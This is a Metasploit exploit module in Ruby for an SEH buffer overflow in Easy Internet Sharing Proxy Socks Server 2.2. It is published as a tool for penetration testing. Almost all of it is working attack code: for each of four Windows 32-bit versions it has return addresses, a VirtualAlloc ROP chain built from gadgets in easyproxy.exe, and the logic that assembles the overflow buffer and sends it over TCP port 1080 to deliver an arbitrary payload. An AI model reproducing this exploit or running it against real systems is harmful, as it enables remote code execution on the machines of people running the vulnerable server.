##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy Internet Sharing Proxy Server 2.2 SEH buffer Overflow',
      'Description'    => %q{
        This module exploits a SEH buffer overflow in the Easy Internet Sharing Proxy Socks Server 2.2
      },
      'Platform'       => 'win',
      'Author'         =>
        [
          'tracyturben[at]gmail.com'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ %w{URL http://www.sharing-file.com/products.htm}]
        ],
      'Privileged'     => false,

      'Payload'        =>
        {
          'Space'           => 836,
          'BadChars' => '\x90\x3b\x0d\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c',
          'StackAdjustment' => -3500,
        },
      'Targets'=>
        [
          [ 'Windows 10 32bit', { 'Ret' => 0x0043AD2C,'Offset' => 836,'Nops' => 44 } ],
          [ 'Windows 8.1 32bit SP1', { 'Ret' => 0x0043AD30,'Offset' => 908 } ],
          [ 'Windows 7 32bit SP1', { 'Ret' => 0x0043AD38,'Offset' => 884 } ],
          [ 'Windows Vista 32bit SP2 ', { 'Ret' => 0x0043AD38,'Offset' => 864 } ]
        ],
      'DefaultOptions'=>{
      'RPORT'=> 1080,
      'EXITFUNC'=> 'thread'
        },
      'DisclosureDate' => 'Nov 10 2016',
      'DefaultTarget'=> 0))
end

  def exploit
    connect
    rop_gadgets =''

    if target.name =~ /Vista 32bit/

     print_good("Building Windows Vista Rop Chain")
     rop_gadgets =
     [
      0x0043fb03,
      0x0043fb03,
      0x0043fb03,
      0x0043fb03,
      0x0043fb03,
      0x00454559,  # POP EAX # RETN [easyproxy.exe]
      0x00489210,  # ptr to &VirtualAlloc() [IAT easyproxy.exe]
      0x00462589,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [easyproxy.exe]
      0x004768eb,  # PUSH EAX # POP ESI # RETN 0x04 [easyproxy.exe]
      0x004543b2,  # POP EBP # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x00417771,  # & push esp # ret 0x1C [easyproxy.exe]
      0x0046764d,  # POP EBX # RETN [easyproxy.exe]
      0x00000001,  # 0x00000001-> ebx
      0x004532e5,  # POP EBX # RETN [easyproxy.exe]
      0x00001000,  # 0x00001000-> edx
      0x0045a4ec,  # XOR EDX,EDX # RETN [easyproxy.exe]
      0x0045276e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [easyproxy.exe]
      0x00000001,  # size
      0x00486fac,  # POP ECX # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x00000040,  # 0x00000040-> ecx
      0x0044fc45,  # POP EDI # RETN [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0045460d,  # POP EAX # RETN [easyproxy.exe]
      0x90909090,  # nop
      0x0047d30f,  # PUSHAD # ADD AL,0 # RETN [easyproxy.exe]
   ].flatten.pack('V*')

   print_good('Building Exploit...')
   sploit = "\x90" *46
   sploit << rop_gadgets
   sploit << payload.encoded
   sploit << rand_text_alpha(target['Offset'] - payload.encoded.length)
   sploit << generate_seh_record(target.ret)
   print_good('Sending exploit...')
   sock.put(sploit)

   print_good('Exploit Sent...')

   handler

   disconnect
end

   if target.name =~ /7 32bit/


    print_good('Building Windows 7 Rop Chain')

    rop_gadgets =
    [
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0047da72,  # POP EAX # RETN [easyproxy.exe]
      0x00489210,  # ptr to &VirtualAlloc() [IAT easyproxy.exe]
      0x004510a3,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [easyproxy.exe]
      0x004768eb,  # PUSH EAX # POP ESI # RETN 0x04 [easyproxy.exe]
      0x00450e40,  # POP EBP # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x00417865,  # & push esp # ret 0x1C [easyproxy.exe]
      0x0046934a,  # POP EBX # RETN [easyproxy.exe]
      0x00000001,  # 0x00000001-> ebx
      0x0045a5b4,  # POP EBX # RETN [easyproxy.exe]
      0x00001000,  # 0x00001000-> edx
      0x0045a4ec,  # XOR EDX,EDX # RETN [easyproxy.exe]
      0x0045276e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [easyproxy.exe]
      0x00000001,  # size
      0x0047a3bf,  # POP ECX # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x00000040,  # 0x00000040-> ecx
      0x00453ce6,  # POP EDI # RETN [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x00478ecd,  # POP EAX # RETN [easyproxy.exe]
      0x90909090,  # nop
      0x0047d30f,  # PUSHAD # ADD AL,0 # RETN [easyproxy.exe]
    ].flatten.pack('V*')

    print_good('Building Exploit...')
    sploit = "\x90" *26
    sploit << rop_gadgets
    sploit << payload.encoded
    sploit << rand_text_alpha(target['Offset'] - payload.encoded.length)
    sploit << generate_seh_record(target.ret)
    print_good('Sending exploit...')
    sock.put(sploit)

    print_good('Exploit Sent...')
    sleep(5)
    handler

    disconnect

end

   if target.name =~ /8.1 32bit/

    print_good('Building Windows 8 Rop Chain')

    rop_gadgets =
    [
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0047da72,  # POP EAX # RETN [easyproxy.exe]
      0x00489210,  # ptr to &VirtualAlloc() [IAT easyproxy.exe]
      0x004510a3,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [easyproxy.exe]
      0x004768eb,  # PUSH EAX # POP ESI # RETN 0x04 [easyproxy.exe]
      0x00450e40,  # POP EBP # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x00417865,  # & push esp # ret 0x1C [easyproxy.exe]
      0x0046934a,  # POP EBX # RETN [easyproxy.exe]
      0x00000001,  # 0x00000001-> ebx
      0x0045a5b4,  # POP EBX # RETN [easyproxy.exe]
      0x00001000,  # 0x00001000-> edx
      0x0045a4ec,  # XOR EDX,EDX # RETN [easyproxy.exe]
      0x0045276e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [easyproxy.exe]
      0x00000001,  # size
      0x0047a3bf,  # POP ECX # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x00000040,  # 0x00000040-> ecx
      0x00453ce6,  # POP EDI # RETN [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x00478ecd,  # POP EAX # RETN [easyproxy.exe]
      0x90909090,  # nop
      0x0047d30f,  # PUSHAD # ADD AL,0 # RETN [easyproxy.exe]

    ].flatten.pack('V*')

    print_good('Building Exploit...')
    sploit = "\x90" *2
    sploit << rop_gadgets
    sploit << payload.encoded
    sploit << rand_text_alpha(target['Offset'] - payload.encoded.length)
    sploit << generate_seh_record(target.ret)
    print_good('Sending exploit...')
    sock.put(sploit)
    print_good('Exploit Sent...')
    handler

    disconnect


end

    if target.name =~ /10 32bit/



    print_good('Building Windows 10 Rop Chain')

    rop_gadgets =
    [
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x0047f1de,  # POP EBX # RETN [easyproxy.exe]
      0x00489210,  # ptr to &VirtualAlloc() [IAT easyproxy.exe]
      0x0045a4ec,  # XOR EDX,EDX # RETN [easyproxy.exe]
      0x0045276e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [easyproxy.exe]
      0x41414141,  # Filler (compensate)
      0x00438d30,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x004768eb,  # PUSH EAX # POP ESI # RETN 0x04 [easyproxy.exe]
      0x004676b0,  # POP EBP # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x00417771,  # & push esp # ret 0x1C [easyproxy.exe]
      0x0046bf38,  # POP EBX # RETN [easyproxy.exe]
      0x00000001,  # 0x00000001-> ebx
      0x00481477,  # POP EBX # RETN [easyproxy.exe]
      0x00001000,  # 0x00001000-> edx
      0x0045a4ec,  # XOR EDX,EDX # RETN [easyproxy.exe]
      0x0045276e,  # ADD EDX,EBX # POP EBX # RETN 0x10 [easyproxy.exe]
      0x00000001,  # Filler (compensate)
      0x00488098,  # POP ECX # RETN [easyproxy.exe]
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x00000040,  # 0x00000040-> ecx
      0x0044ca38,  # POP EDI # RETN [easyproxy.exe]
      0x0043fb03,  # RETN (ROP NOP) [easyproxy.exe]
      0x00454559,  # POP EAX # RETN [easyproxy.exe]
      0x90909090,  # nop
      0x0047d30f,  # PUSHAD # ADD AL,0 # RETN [easyproxy.exe]
    ].flatten.pack('V*')

    print_good('Building Exploit...')
    sploit = "\x90" *2
    sploit << rop_gadgets
    sploit << payload.encoded
    sploit << make_nops(target['Nops'])
    sploit << rand_text_alpha(target['Offset'] - payload.encoded.length)
    sploit << generate_seh_record(target.ret)
    print_good('Sending exploit...')
    sock.put(sploit)

    print_good('Exploit Sent...')

    handler


    disconnect

  end
 end
end

